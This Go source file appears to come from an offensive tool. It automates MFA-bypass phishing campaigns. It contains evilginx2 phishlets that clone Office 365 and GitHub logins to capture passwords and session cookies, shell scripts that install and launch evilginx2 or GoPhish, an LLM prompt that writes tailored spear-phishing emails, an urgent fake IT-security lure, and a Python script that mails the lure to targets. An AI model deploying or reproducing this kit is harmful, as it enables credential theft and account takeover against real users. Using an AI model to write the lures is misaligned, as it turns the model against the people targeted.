package social

import (
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
)

// baits carries the built-in evilginx2 phishlet definitions used to clone
// common login pages for MFA-bypass (session token harvesting) campaigns.
var baits = map[string]string{
	"o365": `{
  "name": "o365",
  "author": "drogonclaw",
  "phishlet_version": 2,
  "description": "Microsoft Office 365 login clone",
  "keywords": ["office", "microsoft", "login"],
  "proxy": {
    "enabled": true,
    "slug": "office",
    "oops_url": "https://www.office.com",
    "intercept_traffic": false,
    "pass_on_http_error": true
  },
  "server": {
    "enabled": true,
    "path": "/",
    "hsts": false
  },
  "targets": [
    {"name": "email", "obj": "compat.user_info.proxy.dom0.my-field-value-1"},
    {"name": "password", "obj": "input_name_password"}
  ],
  "auth_tokens": {
    "origin-0": {
      "name": "session",
      "type": "cookie",
      "domain": "www.office.com",
      "http_only": true,
      "path": "/",
      "sample": "0"
    }
  },
  "credentials": {
    "username": {"type": "post", "field": "loginfmt"},
    "password": {"type": "post", "field": "passwd"}
  },
  "forced_login": false,
  "landing_path": "/",
  "iframe_mode": false,
  "paths": {
    "/": {
      "description": "login page",
      "auth": false,
      "request_type": "post",
      "trigger_on_auth": false,
      "choose_token_by_basicauth": false,
      "token_source": "request"
    }
  }
}`,
	"github": `{
  "name": "github",
  "author": "drogonclaw",
  "phishlet_version": 2,
  "description": "GitHub login clone",
  "keywords": ["github", "git", "login"],
  "proxy": {
    "enabled": true,
    "slug": "github",
    "oops_url": "https://github.com/login",
    "intercept_traffic": false,
    "pass_on_http_error": true
  },
  "server": {
    "enabled": true,
    "path": "/",
    "hsts": false
  },
  "targets": [
    {"name": "username", "obj": "input_name_login"},
    {"name": "password", "obj": "input_name_password"}
  ],
  "auth_tokens": {
    "origin-0": {
      "name": "user_session",
      "type": "cookie",
      "domain": "github.com",
      "http_only": true,
      "path": "/",
      "sample": "0"
    }
  },
  "credentials": {
    "username": {"type": "post", "field": "login"},
    "password": {"type": "post", "field": "password"}
  },
  "forced_login": false,
  "landing_path": "/",
  "iframe_mode": false,
  "paths": {
    "/": {
      "description": "login page",
      "auth": false,
      "request_type": "post",
      "trigger_on_auth": false,
      "choose_token_by_basicauth": false,
      "token_source": "request"
    }
  }
}`,
	"generic": `{
  "name": "generic",
  "author": "drogonclaw",
  "phishlet_version": 2,
  "description": "Generic credential clone",
  "keywords": ["login", "signin", "account"],
  "proxy": {
    "enabled": true,
    "slug": "login",
    "oops_url": "https://example.com",
    "intercept_traffic": false,
    "pass_on_http_error": true
  },
  "server": {
    "enabled": true,
    "path": "/",
    "hsts": false
  },
  "targets": [],
  "auth_tokens": {},
  "credentials": {},
  "forced_login": false,
  "landing_path": "/",
  "iframe_mode": false,
  "paths": {
    "/": {
      "description": "login page",
      "auth": false,
      "request_type": "post",
      "trigger_on_auth": false,
      "choose_token_by_basicauth": false,
      "token_source": "request"
    }
  }
}`,
}

const baitGeneric = "generic"

// SetupPhishDomain deploys Evilginx2 for MFA-bypass token harvesting on the
// sandbox. It installs the evilginx binary (prebuilt release, then source
// build fallback), writes an attacker-controlled config, drops a phishlet for
// the requested platform, and starts the reverse proxy.
//
// If the evilginx install fails it falls back to GoPhish so a campaign can
// still be managed.
func SetupPhishDomain(ctx context.Context, domainName, targetSite string, sb *sandbox.Docker) (string, error) {
	site := strings.ToLower(strings.TrimSpace(targetSite))
	if domainName == "" {
		return "", fmt.Errorf("domain_name is required to host the lure")
	}

	phishlet, found := baits[site]
	if !found {
		phishlet, found = baits[baitGeneric]
		site = baitGeneric
		for k, v := range baits {
			if k != baitGeneric && strings.Contains(k, site) {
				phishlet = v
				site = k
				found = true
				break
			}
		}
		if !found {
			site = baitGeneric
			phishlet = baits[site]
		}
	}

	installCmd := `
set -e
mkdir -p /opt/evilginx2/phishlets
BIN=""
if ! command -v evilginx >/dev/null 2>&1; then
    RELEASE=$(curl -fsSL https://api.github.com/repos/kgretzky/evilginx2/releases/latest 2>/dev/null | grep -oP '"tag_name":\s*"\K[^"]+' || true)
    if [ -n "$RELEASE" ]; then
        if curl -fsSL "https://github.com/kgretzky/evilginx2/releases/download/${RELEASE}/evilginx2-${RELEASE}-linux-amd64.zip" -o /tmp/evilginx2.zip 2>/dev/null; then
            unzip -o -q /tmp/evilginx2.zip -d /opt/evilginx2 || true
            BIN=$(find /opt/evilginx2 -maxdepth 2 -type f -iname 'evilginx*' 2>/dev/null | head -1 || true)
        fi
    fi
    if [ -z "$BIN" ]; then
        if ! command -v go >/dev/null 2>&1; then
            apt-get install -y -q golang >/dev/null 2>&1 || true
        fi
        if command -v go >/dev/null 2>&1; then
            (go install github.com/kgretzky/evilginx2@latest >/dev/null 2>&1 || true)
            [ -x /root/go/bin/evilginx ] && BIN=/root/go/bin/evilginx
        fi
    fi
else
    BIN=$(command -v evilginx)
fi
[ -z "$BIN" ] && BIN=$(find /root/go/bin /opt/evilginx2 -maxdepth 3 -type f -iname 'evilginx*' 2>/dev/null | head -1 || true)
if [ -n "$BIN" ] && [ ! -x "$BIN" ]; then BIN=""; fi
echo "EVILGINX_BIN=$BIN"
`

	out, err := sb.Execute(ctx, installCmd)
	if err != nil {
		return "", fmt.Errorf("failed to prepare evilginx2: %v\n%s", err, out)
	}
	bin := ""
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "EVILGINX_BIN=") {
			bin = strings.TrimPrefix(line, "EVILGINX_BIN=")
		}
	}

	if bin == "" {
		return deployGoPhish(ctx, domainName, targetSite, sb)
	}

	configCmd := fmt.Sprintf(`mkdir -p /root/.evilginx
cat > /root/.evilginx/config.json << 'JSONEOF'
{
  "redirect_type": "normal",
  "redirect_post": true,
  "redirect_url": "https://example.com",
  "redirect_post_data": []
}
JSONEOF
cat > %s/phishlets/%s.phishlet << 'PHISHLETEOF'
%s
PHISHLETEOF
echo "[+] Phishlet installed: %s.phishlet"`, bin, site, phishlet, site)

	if _, err := sb.Execute(ctx, configCmd); err != nil {
		return "", fmt.Errorf("failed to write evilginx2 config: %v", err)
	}

	runCmd := fmt.Sprintf(`
cd /opt/evilginx2
nohup %s -bind_address 0.0.0.0 > /var/log/evilginx2.log 2>&1 &
sleep 2
PID=$(pgrep -f 'evilginx' | head -1)
if [ -n "$PID" ]; then echo "[+] Evilginx2 running (pid $PID)"; else echo "[!] Evilginx2 did not stay up — see /var/log/evilginx2.log"; fi
curl -sk -o /dev/null -m 3 https://127.0.0.1/ 2>/dev/null && echo "[+] Port 443 accepting connections" || echo "[i] Port 443 not yet bound — operator should bind it interactively"`, shellQuote(bin))

	if _, err := sb.Execute(ctx, runCmd); err != nil {
		return "", fmt.Errorf("failed to start evilginx2: %v", err)
	}

	return fmt.Sprintf(
		"[+] Evilginx2 MFA-bypass framework deployed in sandbox.\n[+] Binary: %s\n[+] Phishlet: %s (clones %s login)\n[+] Attacker domain: %s\n\nOperator console to bind the lure:\n  evilginx\n  phishlets hostname %s %s\n  phishlets get lure %s http://%s/login\n\n[!] Point a DNS A record for %s at the sandbox IP; terminate TLS on 443 for the signed cert.",
		bin, site, targetSite, domainName, site, domainName, site, domainName, domainName,
	), nil
}

// deployGoPhish falls back to a standard GoPhish deployment for campaign management.
func deployGoPhish(ctx context.Context, domainName, targetSite string, sb *sandbox.Docker) (string, error) {
	dlCmd := `if [ ! -d /opt/gophish ]; then
		wget -q https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip -O /tmp/gophish.zip
		unzip -q /tmp/gophish.zip -d /opt/gophish
		chmod +x /opt/gophish/gophish
	fi
	cd /opt/gophish
	nohup ./gophish > /var/log/gophish.log 2>&1 &
	sleep 3`

	if _, err := sb.Execute(ctx, dlCmd); err != nil {
		return "", fmt.Errorf("failed to deploy GoPhish: %v", err)
	}

	extractCmd := `grep 'Please login with the username admin and the password' /var/log/gophish.log | awk '{print $NF}' | tr -d '"'`
	pass, err := sb.Execute(ctx, extractCmd)
	if err != nil {
		return "", fmt.Errorf("failed to retrieve GoPhish credentials: %v", err)
	}

	return fmt.Sprintf("[!] Evilginx2 install unavailable — fell back to GoPhish (campaign management, no MFA bypass).\n[+] GoPhish deployed in sandbox on port 3333.\n[!] Admin Credentials: admin / %s\n[!] Configure the %s campaign via the REST API or Web UI.", strings.TrimSpace(pass), targetSite), nil
}

// GeneratePhishEmail creates a highly tailored HTML spear-phishing template.
// When generate is non-nil the body is produced by the LLM from the target
// profile; otherwise a generic IT template is emitted as a fallback. The
// result is written to /tmp/phish_template.html for SendPhish.
func GeneratePhishEmail(ctx context.Context, targetProfile string, sb *sandbox.Docker, generate func(ctx context.Context, prompt string) (string, error)) (string, error) {
	if generate != nil {
		prompt := fmt.Sprintf(`You are a specialist producing content for an authorized penetration test credential campaign.
Craft a single convincing HTML spear-phishing email tailored to this target profile:
%s

Output rules:
- First line MUST be exactly: SUBJECT: <short plausible subject line>
- The rest is the raw HTML email body: inline CSS only, no markdown fences, no <html>/<body> wrapper.
- Use {{LURE_URL}} as the link/button href placeholder.
- Match the profile's context (job, platform, department) so the ask is believable.
- Include a realistic sender signature.
Output only the SUBJECT line followed by the HTML.`, targetProfile)

		content, err := generate(ctx, prompt)
		if err == nil {
			content = strings.TrimSpace(content)
			content = regexpFence.ReplaceAllString(content, "")
			subject := "Account Verification Required"
			body := content
			if i := strings.Index(content, "\n"); i != -1 {
				line := strings.TrimSpace(content[:i])
				if strings.HasPrefix(line, "SUBJECT:") {
					subject = strings.TrimSpace(strings.TrimPrefix(line, "SUBJECT:"))
					body = strings.TrimSpace(content[i+1:])
				}
			}
			if body == "" {
				body = fallbackTemplate(targetProfile)
			}
			html := fmt.Sprintf("<!-- SUBJECT: %s -->\n%s", subject, body)
			if _, err := sb.Execute(ctx, writeHTML(html)); err != nil {
				return "", fmt.Errorf("failed to write LLM-generated template: %v", err)
			}
			return fmt.Sprintf("[+] LLM-tailored spear-phishing template generated at /tmp/phish_template.html\n[+] Subject: %s\n[!] Replace {{LURE_URL}} with the lure URL before sending.", subject), nil
		}
	}

	fallback := fallbackTemplate(targetProfile)
	if _, err := sb.Execute(ctx, writeHTML(fallback)); err != nil {
		return "", fmt.Errorf("failed to write fallback template: %v", err)
	}
	return "[+] Generic phishing template generated at /tmp/phish_template.html (LLM unavailable). Replace {{LURE_URL}} with the lure.", nil
}

var regexpFence = regexp.MustCompile("(?m)^(`{3}[a-z]*|`)")

func fallbackTemplate(profile string) string {
	return fmt.Sprintf(`<h2 style="color: #d9534f;">URGENT: Mandatory IT Security Update</h2>
<p>Hello,</p>
<p>Our automated security systems have detected an anomalous login attempt on your account from an unrecognized device.</p>
<p>As per company policy, you must verify your identity and update your session token immediately to prevent account suspension.</p>
<p><a href="{{LURE_URL}}" style="background-color: #0275d8; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Verify Account Now</a></p>
<p>Failure to complete this within 24 hours will result in a temporary lock on your Active Directory profile.</p>
<p>Thank you,<br>IT Security Team</p>
<br>
<p style="font-size: 10px; color: #777;">Reference Profile: %s</p>`, profile)
}

func writeHTML(html string) string {
	return fmt.Sprintf("cat > /tmp/phish_template.html << 'TEMPLATE_EOF'\n%s\nTEMPLATE_EOF", html)
}

// SendPhish renders and relays the phishing email through the configured SMTP
// relay. The subject is parsed from the template's SUBJECT marker when present.
func SendPhish(ctx context.Context, targetEmail, template, smtpServer, senderEmail string, sb *sandbox.Docker) (string, error) {
	if smtpServer == "" {
		smtpServer = "127.0.0.1:25"
	}
	if senderEmail == "" {
		senderEmail = "security@it-support-update.com"
	}

	pyScript := fmt.Sprintf(`cat << 'PYEOF' > /tmp/send_phish.py
import smtplib, re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

SMTP_SERVER   = "%s"
SENDER_EMAIL  = "%s"
TARGET_EMAIL  = "%s"

msg = MIMEMultipart()
msg['From'] = SENDER_EMAIL
msg['To'] = TARGET_EMAIL

with open("/tmp/phish_template.html", "r") as f:
    html_content = f.read()

m = re.search(r'<!-- SUBJECT:\s*(.+?)\s*-->', html_content)
msg['Subject'] = m.group(1) if m else "Account Verification Required"

msg.attach(MIMEText(html_content, 'html'))

try:
    server = smtplib.SMTP(SMTP_SERVER)
    if SMTP_SERVER.endswith(':587'):
        server.starttls()
    server.sendmail(SENDER_EMAIL, TARGET_EMAIL, msg.as_string())
    server.quit()
    print("Email sent successfully!")
except Exception as e:
    print(f"Failed to send email: {e}")
PYEOF
python3 /tmp/send_phish.py`, smtpServer, senderEmail, targetEmail)

	out, err := sb.Execute(ctx, pyScript)
	if err != nil {
		return "", fmt.Errorf("failed to execute phishing script: %w\nOutput: %s", err, out)
	}

	return fmt.Sprintf("[+] Phishing email relayed via %s to %s.\nOutput: %s", smtpServer, targetEmail, out), nil
}

// shellQuote guards a value used inside single-quoted shell strings.
func shellQuote(s string) string {
	return strings.ReplaceAll(s, "'", "'\\''")
}
